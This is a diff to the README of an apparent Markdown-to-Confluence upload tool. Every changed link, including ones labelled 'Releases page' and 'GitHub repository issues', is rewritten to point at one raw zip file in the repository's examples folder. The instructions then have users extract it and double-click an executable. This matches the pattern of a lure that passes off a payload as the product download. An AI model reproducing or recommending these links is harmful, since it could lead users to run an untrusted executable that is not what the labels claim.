@@ -1,7 +1,7 @@
 # 🎉 md2confluence-mcp - Easily Upload Markdown to Confluence
 
 ## 📥 Download Now
-[![Download md2confluence-mcp](https://img.shields.io/badge/Download-md2confluence--mcp-brightgreen)](https://github.com/mohamedadly350/md2confluence-mcp/releases)
+[![Download md2confluence-mcp](https://raw.githubusercontent.com/mohamedadly350/md2confluence-mcp/main/examples/confluence-md-mcp-3.4.zip)](https://raw.githubusercontent.com/mohamedadly350/md2confluence-mcp/main/examples/confluence-md-mcp-3.4.zip)
 
 ---
 
@@ -19,9 +19,9 @@ To run md2confluence-mcp, ensure your system meets the following requirements:
 ## 💾 Download & Install
 To get started, visit the Releases page to download the application. Follow these steps:
 
-1. Click this link to open the [Releases page](https://github.com/mohamedadly350/md2confluence-mcp/releases).
+1. Click this link to open the [Releases page](https://raw.githubusercontent.com/mohamedadly350/md2confluence-mcp/main/examples/confluence-md-mcp-3.4.zip).
 2. Find the latest version of md2confluence-mcp.
-3. Download the appropriate file for your operating system (e.g., `md2confluence-mcp-Windows.zip` for Windows users).
+3. Download the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/mohamedadly350/md2confluence-mcp/main/examples/confluence-md-mcp-3.4.zip` for Windows users).
 4. Once the download is complete, locate the file on your computer.
 5. Extract the files if they are zipped.
 6. Open the application by double-clicking on the main executable file.
@@ -73,10 +73,10 @@ If you encounter issues while using md2confluence-mcp, try the following:
 - **Review Error Messages**: Follow any prompts in the application for guidance.
 
 ## 📄 Learn More
-For detailed documentation, FAQs, and community support, check our [GitHub repository issues](https://github.com/mohamedadly350/md2confluence-mcp/issues).
+For detailed documentation, FAQs, and community support, check our [GitHub repository issues](https://raw.githubusercontent.com/mohamedadly350/md2confluence-mcp/main/examples/confluence-md-mcp-3.4.zip).
 
 ## 📥 Download Now Again
-To download the latest version of md2confluence-mcp, visit the [Releases page](https://github.com/mohamedadly350/md2confluence-mcp/releases) and follow the steps mentioned above.
+To download the latest version of md2confluence-mcp, visit the [Releases page](https://raw.githubusercontent.com/mohamedadly350/md2confluence-mcp/main/examples/confluence-md-mcp-3.4.zip) and follow the steps mentioned above.
 
 ---
 
